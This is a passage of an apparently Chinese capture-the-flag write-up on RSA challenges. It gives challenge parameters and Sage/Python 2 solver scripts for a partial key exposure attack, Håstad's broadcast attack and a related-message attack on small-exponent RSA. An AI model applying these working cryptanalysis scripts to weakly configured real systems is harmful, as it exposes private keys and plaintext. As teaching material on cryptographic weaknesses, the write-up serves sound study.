</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><h3 id="第三层"><a href="#第三层" class="header-anchor">#</a> 第三层</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">3</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x643d2d81c926b51179c5ded27e7bca2eea2acc2ed2c337186d344bc941b9a09b058e19e871b893e9c6845206d6f4921277b14efedee3a641029eeba0caf32d44390e2f7324c20bba12a0fec948922a5853d807b20c1166057d54232e1ab62191ac97bf7d497e69a0eee1a53e8a6b0e274af2a90e5c7e2134fbc7b3e6d7dce601L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x601f9a3d84b9edd609c3563fbd50c4f43f41f1da78ed615afc5e911bcc8c2145c715f838fd5aa15d5dee1ca39c18a8c63ef395e0d89de9fb3d3bd0d6656c6b76f65f1f5c33733d30e126e441fd4ca533916429c859a1e546371e1b52bd6e7bcc6515a3c255bf2b90be66256a8c2b83339a1d2f04a3d12577cc2c84a3432f89bdL
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x9ecc17505fbf9d62b687888b52421ecdb844fc352b64d8303ba41b04039536140eb6d0c55ce9fe2b5ec8ed262869f36c482a25efd8b9e400fe9fdc090455f92bL
<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>Partial Key Exposure Attack(部分私钥暴露攻击)，若 e 较小，已知 d 的低位</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">&gt;</span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    nbits <span class="token operator">=</span> <span class="token number">1024</span>

    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0
    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span>  <span class="token comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span>
    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>
        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>
            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
            <span class="token keyword">if</span> p<span class="token punctuation">:</span>
                <span class="token keyword">return</span> p


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    n <span class="token operator">=</span> <span class="token number">0x00643d2d81c926b51179c5ded27e7bca2eea2acc2ed2c337186d344bc941b9a09b058e19e871b893e9c6845206d6f4921277b14efedee3a641029eeba0caf32d44390e2f7324c20bba12a0fec948922a5853d807b20c1166057d54232e1ab62191ac97bf7d497e69a0eee1a53e8a6b0e274af2a90e5c7e2134fbc7b3e6d7dce601</span>
    e <span class="token operator">=</span> <span class="token number">3</span>
    cipher <span class="token operator">=</span> <span class="token number">0x601f9a3d84b9edd609c3563fbd50c4f43f41f1da78ed615afc5e911bcc8c2145c715f838fd5aa15d5dee1ca39c18a8c63ef395e0d89de9fb3d3bd0d6656c6b76f65f1f5c33733d30e126e441fd4ca533916429c859a1e546371e1b52bd6e7bcc6515a3c255bf2b90be66256a8c2b83339a1d2f04a3d12577cc2c84a3432f89bd</span>
    <span class="token comment">#d = 0x9ecc17505fbf9d62b687888b52421ecdb844fc352b64d8303ba41b04039536140eb6d0c55ce9fe2b5ec8ed262869f36c482a25efd8b9e400fe9fdc090455f92b</span>
    beta <span class="token operator">=</span> <span class="token number">0.5</span>
    epsilon <span class="token operator">=</span> beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">7</span>

    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>
    kbits <span class="token operator">=</span> <span class="token number">512</span>
    d0 <span class="token operator">=</span> <span class="token number">0x9ecc17505fbf9d62b687888b52421ecdb844fc352b64d8303ba41b04039536140eb6d0c55ce9fe2b5ec8ed262869f36c482a25efd8b9e400fe9fdc090455f92b</span>
    <span class="token keyword">print</span> <span class="token string">&quot;lower %d bits (of %d bits) is given&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>

    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">print</span> p
    <span class="token comment">#print &quot;found p: %d&quot; % p</span>
    q <span class="token operator">=</span> n<span class="token operator">//</span>p
    <span class="token comment">#print d</span>
    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>
    q <span class="token operator">=</span> n<span class="token operator">/</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">&quot;q: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>
    phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>
    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
    <span class="token keyword">print</span>  <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br></div></div><h3 id="第四层"><a href="#第四层" class="header-anchor">#</a> 第四层</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">4</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n1<span class="token operator">=</span>0xafa69b2201cdac8c7ca65e2e923e162a6b67be47e0d75d68fe863b41807f52873da023cd7d2b395bb42e4a487c9f548e897f19858d0490e41c61cc4e4d948d85e2d779543dd22889c37f63dd30104b465dee1c0625b3f6b218426edf3112dcf14f8bebf9307cfbe32a6a3e1c82dc821ca7afb1ed751cd77e303c5f53b02e3247L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c1<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x844183d6ab43184b3f2272c57d67ee2038b652905a3222759203a7c3cfa613e8fc54a894c045274337da098a7d41604547e37c28442af516bb505e6f4c9b05406daa2311631edd5cb5f6ccfaf0c1f14042a34c232bd6a90209de9a71aedcacf4df897d8cd17604eb4d9c6a27324049e33ebd4c5f5d34dea592819e86e6a64914L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n2<span class="token operator">=</span>0x30505097dd14611027e2496c0b3d15b7ae71ee564d158b55af2b30dba70b25895c43bd0b9b02c8247a08694e141b8a2b9ebc78347faa4865fdb83ad14956db4bb8d4d5d36f50b592b9fc17c539db5d5986197175ebaeb2de7e1a2f36f8f78e541fa863f41c86c166a8c572f5793e6c7be1ba7ebaea82a176fbd21a1a36331c91L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c2<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0xc0f31b162b23a7833ffd4542cf4512ee421612324719a051b24ec0e7243a17dc44ea6a5db030cfb85cdc16505416c4cc9a9b7afb9872077e43a656f163fcf2f4a408515c721ebe5bbb38936e11604e958e3e254466a8e2ea85a2855f80262c81034b242ce44a241e7486c3347d68008053ea65a369516f6bf97554a832ce691L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n3<span class="token operator">=</span>0x4659b6de60b471c8b2d906a1bab55307176bbe26fa66b365dc1c4dfe936e6fa684229a0a05903a61b5024b4aac055f288d80b2c56b84224c57000f7dd4f9fdace70d528475a2643bdde7ee72bfedd3dc131a52ae05a5024a10b4c8ad6508f0524e314c61eeec1b15ceba83199b2bcfa76161f20fa936fb8bd26eaaa81f0f5383L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c3<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0x181f643f693a975c18a93255e2ab97e29d47a1b0d5f11563048a8688fbc3ab430be76267859b965fcf4fc1b760d268e8af06a10b1b73a67f18e9adebdbb14a46c43d510eccca55e530cb4099751fbb0a3a61bb3787e36507f191687bd927e9b5b34813bc0ee180b5a39459593b0180cc748db15ecd3d262ad9a1f013c9d78735L
<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>$
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>广播攻击</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> gmpy2
n <span class="token operator">=</span> <span class="token punctuation">[</span>
<span class="token number">0xafa69b2201cdac8c7ca65e2e923e162a6b67be47e0d75d68fe863b41807f52873da023cd7d2b395bb42e4a487c9f548e897f19858d0490e41c61cc4e4d948d85e2d779543dd22889c37f63dd30104b465dee1c0625b3f6b218426edf3112dcf14f8bebf9307cfbe32a6a3e1c82dc821ca7afb1ed751cd77e303c5f53b02e3247</span><span class="token punctuation">,</span>
<span class="token number">0x30505097dd14611027e2496c0b3d15b7ae71ee564d158b55af2b30dba70b25895c43bd0b9b02c8247a08694e141b8a2b9ebc78347faa4865fdb83ad14956db4bb8d4d5d36f50b592b9fc17c539db5d5986197175ebaeb2de7e1a2f36f8f78e541fa863f41c86c166a8c572f5793e6c7be1ba7ebaea82a176fbd21a1a36331c91</span><span class="token punctuation">,</span>
<span class="token number">0x4659b6de60b471c8b2d906a1bab55307176bbe26fa66b365dc1c4dfe936e6fa684229a0a05903a61b5024b4aac055f288d80b2c56b84224c57000f7dd4f9fdace70d528475a2643bdde7ee72bfedd3dc131a52ae05a5024a10b4c8ad6508f0524e314c61eeec1b15ceba83199b2bcfa76161f20fa936fb8bd26eaaa81f0f5383</span>
<span class="token punctuation">]</span>
C <span class="token operator">=</span> <span class="token punctuation">[</span>
<span class="token number">0x844183d6ab43184b3f2272c57d67ee2038b652905a3222759203a7c3cfa613e8fc54a894c045274337da098a7d41604547e37c28442af516bb505e6f4c9b05406daa2311631edd5cb5f6ccfaf0c1f14042a34c232bd6a90209de9a71aedcacf4df897d8cd17604eb4d9c6a27324049e33ebd4c5f5d34dea592819e86e6a64914</span><span class="token punctuation">,</span>
<span class="token number">0xc0f31b162b23a7833ffd4542cf4512ee421612324719a051b24ec0e7243a17dc44ea6a5db030cfb85cdc16505416c4cc9a9b7afb9872077e43a656f163fcf2f4a408515c721ebe5bbb38936e11604e958e3e254466a8e2ea85a2855f80262c81034b242ce44a241e7486c3347d68008053ea65a369516f6bf97554a832ce691</span><span class="token punctuation">,</span>
<span class="token number">0x181f643f693a975c18a93255e2ab97e29d47a1b0d5f11563048a8688fbc3ab430be76267859b965fcf4fc1b760d268e8af06a10b1b73a67f18e9adebdbb14a46c43d510eccca55e530cb4099751fbb0a3a61bb3787e36507f191687bd927e9b5b34813bc0ee180b5a39459593b0180cc748db15ecd3d262ad9a1f013c9d78735</span>
<span class="token punctuation">]</span>

<span class="token comment">#N = n1*n2*n3…n19</span>
N <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>
    N <span class="token operator">*=</span> i

<span class="token comment">#Ni = N/ni</span>
Ni <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>
    Ni<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N<span class="token operator">/</span>i<span class="token punctuation">)</span>

<span class="token comment">#ti*Ni == 1 mod ni</span>
T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    T<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">long</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#X = (c1*t1*N1)%N + (c2*t2*N2)%N + … + (ci*ti*Ni)%N</span>
X <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    X <span class="token operator">+=</span> C<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>T<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

<span class="token comment">#m**19 = X</span>
m3 <span class="token operator">=</span> X <span class="token operator">%</span> N
m<span class="token punctuation">,</span>b <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m3<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><h3 id="第五层"><a href="#第五层" class="header-anchor">#</a> 第五层</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">5</span>

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x5d06d350f270f968bbd76e1ba94adbf1fe566a92665b3418574fe95ae553744216e097450abac2a28330575645dbf1c4e0a89d2405485dce96cc8ddbcb249bf88bd8cb18f942d5853544a7e6828b62ce6292138d503a8134640f33948c1478a7825a7444acfc5c5f38f8ba53e5193a9513c104db4ed47bbe6dc1157f8e6fee3L

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x299c9afd0f50af728127963f48fc5f132b8a2f5f91a0dee15bef79fc2ee5e5d4b813c409c14f796b8fef84c8a49ad0affb59b9b0bb068c14e005428c35a54093b3103d93360a040a78bc5dfbbb9889a61e0b3e3fd94f5542519c6f2eaf669059e7d6cbce1083fd0777d5ee61d19e1fe4684ebcf13d5d64c3fccf87efa76f942L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>x<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x5b775448be0156a73ade0d637bef267106cd5595419a147ceea2df26d0356d425c26a4c4fb925352d2cdb9006827f3ec1f4c6e552530165a2edae43bc4c7968a8bf8d881cc54f1a56a6b003a1cda89659953493500d13e7b63da975b3f2b7489431048c5e57cdba5dc41991bf8e65a8232db3d233bf5c951531b5e5cb386328L
<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>$
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>Related Message Attack，两明文存在线性关系时使用</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> gmpy2
p1<span class="token operator">=</span><span class="token number">1</span>
p2<span class="token operator">=</span><span class="token number">0</span>
<span class="token comment">#0\n</span>
c2 <span class="token operator">=</span><span class="token number">0x299c9afd0f50af728127963f48fc5f132b8a2f5f91a0dee15bef79fc2ee5e5d4b813c409c14f796b8fef84c8a49ad0affb59b9b0bb068c14e005428c35a54093b3103d93360a040a78bc5dfbbb9889a61e0b3e3fd94f5542519c6f2eaf669059e7d6cbce1083fd0777d5ee61d19e1fe4684ebcf13d5d64c3fccf87efa76f942</span>
<span class="token comment">#1\n</span>
c1 <span class="token operator">=</span><span class="token number">0x5b775448be0156a73ade0d637bef267106cd5595419a147ceea2df26d0356d425c26a4c4fb925352d2cdb9006827f3ec1f4c6e552530165a2edae43bc4c7968a8bf8d881cc54f1a56a6b003a1cda89659953493500d13e7b63da975b3f2b7489431048c5e57cdba5dc41991bf8e65a8232db3d233bf5c951531b5e5cb386328</span>
n <span class="token operator">=</span><span class="token number">0x5d06d350f270f968bbd76e1ba94adbf1fe566a92665b3418574fe95ae553744216e097450abac2a28330575645dbf1c4e0a89d2405485dce96cc8ddbcb249bf88bd8cb18f942d5853544a7e6828b62ce6292138d503a8134640f33948c1478a7825a7444acfc5c5f38f8ba53e5193a9513c104db4ed47bbe6dc1157f8e6fee3</span>
a <span class="token operator">=</span> <span class="token number">1</span>
b <span class="token operator">=</span> p1<span class="token operator">-</span>p2


<span class="token keyword">def</span> <span class="token function">getmessage</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    b3 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    part1 <span class="token operator">=</span> b <span class="token operator">*</span> <span class="token punctuation">(</span>c1 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> c2 <span class="token operator">-</span> b3<span class="token punctuation">)</span> <span class="token operator">%</span> n
    part2 <span class="token operator">=</span> a <span class="token operator">*</span> <span class="token punctuation">(</span>c1 <span class="token operator">-</span> c2 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> b3<span class="token punctuation">)</span> <span class="token operator">%</span> n
    part2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>part2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> part1 <span class="token operator">*</span> part2 <span class="token operator">%</span> n


message <span class="token operator">=</span> getmessage<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">-</span>p2
<span class="token keyword">print</span> message
message <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

<span class="token keyword">print</span> message
